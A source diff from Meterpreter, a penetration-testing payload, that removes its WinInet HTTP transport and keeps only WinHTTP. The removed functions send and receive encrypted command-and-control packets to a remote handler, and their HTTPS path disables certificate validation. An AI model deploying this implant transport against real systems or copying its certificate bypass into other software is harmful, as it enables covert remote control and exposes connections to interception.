@@ -8,13 +8,7 @@
 #include "common.h"
 
 #ifdef _WIN32
-#ifdef USE_WINHTTP
 #include <winhttp.h>
-#define packet_transmit_via_http_lib packet_transmit_via_http_winhttp
-#else
-#include <wininet.h>
-#define packet_transmit_via_http_lib packet_transmit_via_http_wininet
-#endif
 #endif
 
 DWORD packet_find_tlv_buf(Packet *packet, PUCHAR payload, DWORD payloadLength, DWORD index,
@@ -1292,7 +1286,6 @@ DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompl
 }
 
 #ifdef _WIN32
-#ifdef USE_WINHTTP
 /*!
  * @brief Windows-specific function to transmit a packet via HTTP(s) using winhttp _and_ destroy it.
  * @param remote Pointer to the \c Remote instance.
@@ -1377,79 +1370,6 @@ DWORD packet_transmit_via_http_winhttp(Remote *remote, Packet *packet, PacketReq
 	return res;
 }
 
-#else
-
-/*!
- * @brief Windows-specific function to transmit a packet via HTTP(s) _and_ destroy it.
- * @param remote Pointer to the \c Remote instance.
- * @param packet Pointer to the \c Packet that is to be sent.
- * @param completion Pointer to the completion routines to process.
- * @return An indication of the result of processing the transmission request.
- * @remark This function is not available on POSIX.
- */
-DWORD packet_transmit_via_http_wininet(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
-{
-	DWORD res = 0;
-	HINTERNET hReq;
-	BOOL hRes;
-	DWORD retries = 5;
-	DWORD flags;
-	DWORD flen;
-	unsigned char *buffer;
-
-	flen = sizeof(flags);
-
-	buffer = malloc(packet->payloadLength + sizeof(TlvHeader));
-	if (!buffer)
-	{
-		SetLastError(ERROR_NOT_FOUND);
-		return 0;
-	}
-
-	memcpy(buffer, &packet->header, sizeof(TlvHeader));
-	memcpy(buffer + sizeof(TlvHeader), packet->payload, packet->payloadLength);
-
-	do
-	{
-
-		flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI;
-		if (remote->transport == METERPRETER_TRANSPORT_HTTPS)
-		{
-			flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
-		}
-
-		hReq = HttpOpenRequestW(remote->hConnection, L"POST", remote->uri, NULL, NULL, NULL, flags, 0);
-
-		if (hReq == NULL)
-		{
-			dprintf("[PACKET RECEIVE] Failed HttpOpenRequest: %d", GetLastError());
-			SetLastError(ERROR_NOT_FOUND);
-			break;
-		}
-
-		if (remote->transport == METERPRETER_TRANSPORT_HTTPS)
-		{
-			InternetQueryOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flen);
-			flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
-			InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, flen);
-		}
-
-		hRes = HttpSendRequest(hReq, NULL, 0, buffer, packet->payloadLength + sizeof(TlvHeader));
-
-		if (!hRes)
-		{
-			dprintf("[PACKET RECEIVE] Failed HttpSendRequest: %d", GetLastError());
-			SetLastError(ERROR_NOT_FOUND);
-			break;
-		}
-	} while (0);
-
-	memset(buffer, 0, packet->payloadLength + sizeof(TlvHeader));
-	InternetCloseHandle(hReq);
-	return res;
-}
-#endif
-
 #endif
 
 
@@ -1524,7 +1444,7 @@ DWORD packet_transmit_via_http(Remote *remote, Packet *packet, PacketRequestComp
 
 #ifdef _WIN32
 		dprintf("[PACKET] Transmitting packet of length %d to remote", packet->payloadLength);
-		res = packet_transmit_via_http_lib(remote, packet, completion);
+		res = packet_transmit_via_http_winhttp(remote, packet, completion);
 #else
 		// XXX: Implement non-windows HTTP delivery
 #endif
@@ -1765,8 +1685,6 @@ DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
 }
 
 #ifdef _WIN32
-#ifdef USE_WINHTTP
-
 /*!
  * @brief Windows-specific function to receive a new packet via WinHTTP.
  * @param remote Pointer to the \c Remote instance.
@@ -2046,217 +1964,20 @@ DWORD packet_receive_http_via_winhttp(Remote *remote, Packet **packet)
 	return res;
 }
 
-#else
+#endif
 
 /*!
- * @brief Windows-specific function to receive a new packet via WinInet.
+ * @brief Windows-specific function to receive a new packet via HTTP.
  * @param remote Pointer to the \c Remote instance.
  * @param packet Pointer to a pointer that will receive the \c Packet data.
  * @return An indication of the result of processing the transmission request.
- * @remark This function is not available in POSIX.
- */
-DWORD packet_receive_http_via_wininet( Remote *remote, Packet **packet )
-{
-
-	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
-	CryptoContext *crypto = NULL;
-	Packet *localPacket = NULL;
-	TlvHeader header;
-	LONG bytesRead;
-	BOOL inHeader = TRUE;
-	PUCHAR payload = NULL;
-	ULONG payloadLength;
-	DWORD flags;
-	DWORD flen;
-
-	HINTERNET hReq;
-	BOOL hRes;
-	DWORD retries = 5;
-
-	lock_acquire( remote->lock );
-
-	do
-	{
-
-		flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI;
-		if (remote->transport == METERPRETER_TRANSPORT_HTTPS) {
-			flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
-		}
-
-		dprintf("[PACKET RECEIVE] HttpOpenRequest");
-		hReq = HttpOpenRequestW(remote->hConnection, L"POST", remote->uri, NULL, NULL, NULL, flags, 0 );
-
-		if (hReq == NULL) {
-			dprintf("[PACKET RECEIVE] Failed HttpOpenRequest: %d", GetLastError());
-			SetLastError(ERROR_NOT_FOUND);
-			break;
-		}
-
-		if (remote->transport == METERPRETER_TRANSPORT_HTTPS) {
-			InternetQueryOption( hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flen);
-			flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
-			InternetSetOptionW(hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, flen);
-		}
-
-		hRes = HttpSendRequest(hReq, NULL, 0, "RECV", 4 );
-		if (! hRes) {
-			dprintf("[PACKET RECEIVE] Failed HttpSendRequest: %d", GetLastError());
-			SetLastError(ERROR_NOT_FOUND);
-			break;
-		}
-
-		// Read the packet length
-		retries = 3;
-		while (inHeader && retries > 0)
-		{
-			retries--;
-			if (! InternetReadFile(hReq, ((PUCHAR)&header + headerBytes), sizeof(TlvHeader) - headerBytes, &bytesRead))  {
-				dprintf("[PACKET RECEIVE] Failed HEADER InternetReadFile: %d", GetLastError());
-				SetLastError(ERROR_NOT_FOUND);
-				break;
-			}
-
-			// If the response contains no data, this is fine, it just means the
-			// remote side had nothing to tell us. Indicate this through a
-			// ERROR_EMPTY response code so we can update the timestamp.
-			if (bytesRead == 0) {
-				SetLastError(ERROR_EMPTY);
-				break;
-			}
-
-			headerBytes += bytesRead;
-
-			if (headerBytes != sizeof(TlvHeader)) {
-				continue;
-			} else {
-				inHeader = FALSE;
-			}
-		}
-
-		if (GetLastError() == ERROR_EMPTY)
-			break;
-
-		if (headerBytes != sizeof(TlvHeader)) {
-			SetLastError(ERROR_NOT_FOUND);
-			break;
-		}
-
-		// Initialize the header
-		header.length    = header.length;
-		header.type      = header.type;
-		payloadLength    = ntohl(header.length) - sizeof(TlvHeader);
-		payloadBytesLeft = payloadLength;
-
-		// Allocate the payload
-		if (!(payload = (PUCHAR)malloc(payloadLength)))
-		{
-			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
-			break;
-		}
-
-		// Read the payload
-		retries = payloadBytesLeft;
-		while (payloadBytesLeft > 0 && retries > 0 )
-		{
-			retries--;
-			if (! InternetReadFile(hReq, payload + payloadLength - payloadBytesLeft, payloadBytesLeft, &bytesRead))  {
-				dprintf("[PACKET RECEIVE] Failed BODY InternetReadFile: %d", GetLastError());
-				SetLastError(ERROR_NOT_FOUND);
-				break;
-			}
-
-			if (!bytesRead) {
-				SetLastError(ERROR_NOT_FOUND);
-				break;
-			}
-
-			payloadBytesLeft -= bytesRead;
-		}
-
-		// Didn't finish?
-		if (payloadBytesLeft)
-			break;
-
-		// Allocate a packet structure
-		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
-		{
-			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
-			break;
-		}
-
-		memset( localPacket, 0, sizeof(Packet) );
-
-		// If the connection has an established cipher and this packet is not
-		// plaintext, decrypt
-		if ((crypto = remote_get_cipher(remote)) &&
-		    (packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
-		    (packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
-		{
-			ULONG origPayloadLength = payloadLength;
-			PUCHAR origPayload = payload;
-
-			// Decrypt
-			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength,&payload, &payloadLength)) != ERROR_SUCCESS)
-			{
-				SetLastError(res);
-				break;
-			}
-
-			// We no longer need the encrypted payload
-			free(origPayload);
-		}
-
-		localPacket->header.length = header.length;
-		localPacket->header.type   = header.type;
-		localPacket->payload       = payload;
-		localPacket->payloadLength = payloadLength;
-
-		*packet = localPacket;
-
-		SetLastError(ERROR_SUCCESS);
-
-	} while (0);
-
-	res = GetLastError();
-
-	// Cleanup on failure
-	if (res != ERROR_SUCCESS)
-	{
-		if (payload)
-			free(payload);
-		if (localPacket)
-			free(localPacket);
-	}
-
-	if (hReq)
-		InternetCloseHandle(hReq);
-
-	lock_release( remote->lock );
-
-	return res;
-}
-#endif
-
-#endif
-
-
-
-/*!
- * @brief Windows-specific function to receive a new packet via WinInet.
- * @param remote Pointer to the \c Remote instance.
- * @param packet Pointer to a pointer that will receive the \c Packet data.
- * @return An indication of the result of processing the transmission request.
- * @remark This function is just a proxy which calls \c packet_receive_http_via_wininet
+ * @remark This function is just a proxy which calls \c packet_receive_http_via_winhttp
  *         and doesn't yet have a POSIX implementation.
  */
 DWORD packet_receive_via_http( Remote *remote, Packet **packet )
 {
 #ifdef _WIN32
-#ifdef USE_WINHTTP
 	return packet_receive_http_via_winhttp(remote, packet);
-#else
-	return packet_receive_http_via_wininet(remote, packet);
-#endif
 #else
 	return 0;
 #endif
